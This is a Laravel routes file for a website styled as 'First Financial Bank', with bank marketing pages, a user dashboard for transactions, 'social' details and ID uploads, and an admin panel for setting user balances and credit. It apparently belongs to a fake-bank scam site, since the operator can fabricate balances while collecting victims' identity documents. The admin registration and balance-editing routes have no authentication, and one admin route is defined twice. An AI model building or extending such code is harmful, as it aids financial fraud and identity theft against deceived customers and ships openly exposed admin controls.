<?php

use App\Http\Controllers\Admin\LoginController;
use App\Http\Controllers\Admin\RegisterController;
use App\Http\Controllers\Dash\SocialController;
use App\Http\Controllers\Dash\TransController;
use App\Http\Controllers\Dash\UserController;
use App\Http\Controllers\Dash\VerifyIDController;
use App\Http\Controllers\HomeController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    $title = "Personal Banking | Checking, Savings &amp; Loans | First Financial Bank";
    $des = 'Discover the perks of working with a regional bank, from checking &amp; savings accounts to home mortgages &amp; equity loans. We are ready to help.';
    return view('welcome', [
        'title' => $title,
        'des' => $des
    ]);
})->name('index');

Route::get('/different', function () {
    $title = "We're Different | Updates & Fresh Takes | First Financial Bank";
    $des = "Hear about the latest updates from First Financial Bank and how we're striving to make your banking experience better.";
    return view('different', [
        'title' => $title,
        'des' => $des
    ]);
})->name('different');

Route::get('/personal/flourish/switch-banks', function () {
    $title = "How to Switch Banks in 4 Easy Steps | First Financial Bank";
    $des = "Changing your bank is actually quite easy! First Financial can help you open a new account and transfer funds from your previous bank in four easy steps.";
    return view('switch', [
        'title' => $title,
        'des' => $des
    ]);
})->name('switch');

Route::get('/personal/flourish/home-equity', function () {
    $title = "Home Equity Loan & Lines of Credit | First Financial Bank";
    $des = "Take advantage of your home&'s value by accessing a line of credit to fund renovations, home improvements, big expenses, or other important updates.";
    return view('home_equity', [
        'title' => $title,
        'des' => $des
    ]);
})->name('home.equity');

Route::get('/personal/flourish/mortgage', function () {
    $title = "Mortgage Loans & Refinancing | First Financial Bank";
    $des = "Compare mortgage loan types and find your path to home ownership. Options for refinancing and home equity lines of credit (HELOC) are also available.";
    return view('mortgage', [
        'title' => $title,
        'des' => $des
    ]);
})->name('mortgage');

Route::get('/personal/bank/bank-overview', function () {
    $title = "Most Popular Personal Banking Options | First Financial Bank";
    $des = "See our most popular banking options like personal checking accounts, savings accounts, prepaid reloadable cards, & our banking app with mobile deposit.";
    return view('bank-overview', [
        'title' => $title,
        'des' => $des
    ]);
})->name('bank.overview');

Route::get('/personal/borrow/borrow', function () {
    $title = "Mortgages | Auto Loans | Personal Loans | First Financial Bank";
    $des = "Read more about our offerings which include: mortgages, auto loans, home equity loans, and personal loans.";
    return view('borrow', [
        'title' => $title,
        'des' => $des
    ]);
})->name('borrow');

Route::get('/personal/invest/invest-overview', function () {
    $title = "Personal Investment Management | First Financial Bank";
    $des = "Take the first step towards your financial future with our wealth management services including investment products, financial planning, trust & estate services, retirement planning &a more. We’ll help you chart a path to achieve your financial goals.";
    return view('invest', [
        'title' => $title,
        'des' => $des
    ]);
})->name('invest');

Route::get('/personal/locations', function () {
    $title = "Banking Center & ATM Locations | First Financial Bank";
    $des = "Find the closest banking center or ATM to quickly & conveniently access the financial tools you need.";
    return view('locations', [
        'title' => $title,
        'des' => $des
    ]);
})->name('locations');

Route::get('/about/community-investment-plan', function () {
    $title = "Community Investment Planning | First Financial Bank";
    $des = "See our plans to open 8 new banking centers in low to moderate income communities, increasing philanthropy & establishing an advisory board for governance.";
    return view('community', [
        'title' => $title,
        'des' => $des
    ]);
})->name('community');

Route::get('/about/supplier-diversity', function () {
    $title = "Supplier Diversity Program | First Financial Bank";
    $des = "Apply to our diverse vendors & suppliers program. The entire First Financial Bank team, including vendors, should reflect the community we serve.";
    return view('supplier', [
        'title' => $title,
        'des' => $des
    ]);
})->name('supplier');

Auth::routes(['verify' => true]);

Route::get('/contact', [App\Http\Controllers\HomeContactController::class, 'index'])->name('contact');
Route::post('/contact', [App\Http\Controllers\HomeContactController::class, 'store']);

Route::middleware('verified')->group(function () {

    Route::get('/home', [HomeController::class, 'index'])->name('home');

    Route::get('/user', [UserController::class, 'index'])->name('user');
    Route::post('/user', [UserController::class, 'store']);
    Route::post('/password', [UserController::class, 'change'])->name('password');

    Route::get('/transactions', [TransController::class, 'index'])->name('transactions');
    Route::post('/transactions', [TransController::class, 'store']);

    Route::get('/social', [SocialController::class, 'index'])->name('social');
    Route::post('/social', [SocialController::class, 'store']);

    Route::get('/id', [VerifyIDController::class, 'index'])->name('id.verify');
    Route::post('/id', [VerifyIDController::class, 'store']);
});

Route::get('/admin/register', [App\Http\Controllers\Admin\RegisterController::class, 'index'])->name('admin.register');
Route::post('/admin/register', [App\Http\Controllers\Admin\RegisterController::class, 'store']);

Route::get('/admin/login', [App\Http\Controllers\Admin\LoginController::class, 'index'])->name('admin.login');
Route::post('/admin/login', [App\Http\Controllers\Admin\LoginController::class, 'store']);

Route::post('/admin/logout', [App\Http\Controllers\Admin\LogoutController::class, 'store'])->name('admin.logout');

Route::get('/admin/dashboard', [App\Http\Controllers\Admin\Dash\HomeController::class, 'index'])->name('admin.dashboard');

Route::get('/admin/user/{user}', [App\Http\Controllers\Admin\Dash\UserController::class, 'index'])->name('admin.user');
Route::post('/admin/user/{user}', [App\Http\Controllers\Admin\Dash\UserController::class, 'store']);
Route::post('/admin/balance/{user}', [App\Http\Controllers\Admin\Dash\UserController::class, 'balance'])->name('admin.balance');
Route::post('/admin/credit/{user}', [App\Http\Controllers\Admin\Dash\UserController::class, 'credit'])->name('admin.credit');

Route::get('/admin/message', [App\Http\Controllers\Admin\Dash\MessageController::class, 'index'])->name('admin.message');

Route::get('/admin/settings', [App\Http\Controllers\Admin\Dash\SettingsController::class, 'index'])->name('admin.settings');
Route::post('/admin/settings', [App\Http\Controllers\Admin\Dash\SettingsController::class, 'store']);
Route::post('/admin/chat', [App\Http\Controllers\Admin\Dash\SettingsController::class, 'chat'])->name('admin.chat');
Route::post('/admin/smtp', [App\Http\Controllers\Admin\Dash\SettingsController::class, 'smtp'])->name('admin.smtp');

Route::post('/admin/user/{user}', [App\Http\Controllers\Dash\VerifyIDController::class, 'confirm'])->name('id.verify.user');


